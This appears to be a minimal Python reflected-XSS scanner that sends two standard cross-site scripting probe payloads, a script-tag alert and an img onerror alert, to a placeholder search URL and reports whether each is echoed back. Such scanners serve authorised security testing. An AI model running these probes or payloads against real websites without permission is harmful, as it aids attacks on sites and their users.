import requests
def scan_xss(url, payload):
    response = requests.get(url, params={'q' : payload})
    if payload in response.text:
        return True
    else:
        return False
target_url = 'http://example.com/search'
payloads = ["<script>alert(1)</script>" , "<img src=x onerror=alert(1)>"]
for p in payloads:
    check = scan_xss(target_url, p)
    if check:
        print(f"[+] Found XSS with payload: {p}")
    else:
        print(f"[-] Safe from payload: {p}")
